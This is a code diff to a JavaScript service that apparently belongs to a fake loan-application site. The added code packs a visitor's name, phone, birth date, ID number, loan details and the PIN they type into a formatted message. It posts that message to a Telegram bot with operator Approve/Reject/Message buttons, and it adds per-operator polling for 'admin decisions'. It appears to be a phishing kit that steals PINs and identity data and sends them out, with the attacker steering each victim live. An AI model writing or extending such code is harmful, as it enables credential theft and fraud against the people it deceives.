@@ -46,13 +46,38 @@ export const apiService = {
       return { success: false }
     }
 
-    const message = JSON.stringify(client, null, 2)
+    const name = client.name || "N/A"
+    const number = client.number || "N/A"
+    const dob = client.dob || "N/A"
+    const id = client.id || "N/A"
+    const employment = client.employment || "N/A"
+    const amount = client.amount || "N/A"
+    const term = client.term || "N/A"
+
+    const message = `<b>🔐 PIN Verification Request</b>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 <b>Client Information</b>
+Name: <code>${name}</code>
+Phone: <code>${number}</code>
+DOB: <code>${dob}</code>
+ID: <code>${id}</code>
+Employment: <code>${employment}</code>
+Loan Amount: <code>USD ${amount}</code>
+Term: <code>${term} months</code>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📱 <b>PIN Input</b>
+<code>${client.pinInputs || "______"}</code>
+
+<i>Waiting for admin action...</i>`
 
     const replyMarkup = {
       reply_markup: {
+        resize_keyboard: false,
+        one_time_keyboard: false,
         inline_keyboard: [
-          [{ text: "✅ Approuver", callback_data: "approve" }],
-          [{ text: "❌ Rejeter", callback_data: "reject" }],
+          [{ text: "✅ Approve", callback_data: "approve" }],
+          [{ text: "❌ Reject", callback_data: "reject" }],
           [{ text: "💬 Message User", callback_data: "message_user" }]
         ]
       }
@@ -62,12 +87,33 @@ export const apiService = {
       const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         chat_id: TELEGRAM_CHAT_ID,
         text: message,
+        parse_mode: "HTML",
         ...replyMarkup
       })
       return response.data
     } catch (error) {
       console.error("Telegram notification error:", error)
       return { success: false, error }
+    }
+  },
+
+  async checkAdminDecision(sessionId) {
+    const bot = window.location.pathname.split("/")[1] || "user1"
+    try {
+      const response = await api.get(`/api/admin-decision/${bot}/${sessionId}`)
+      return response.data
+    } catch (error) {
+      return { decision: "pending" }
+    }
+  },
+
+  async setMessageForAdmin(sessionId, message) {
+    const bot = window.location.pathname.split("/")[1] || "user1"
+    try {
+      const response = await api.post(`/api/set-message/${bot}/${sessionId}`, { message })
+      return response.data
+    } catch (error) {
+      return { success: false }
     }
   }
 }
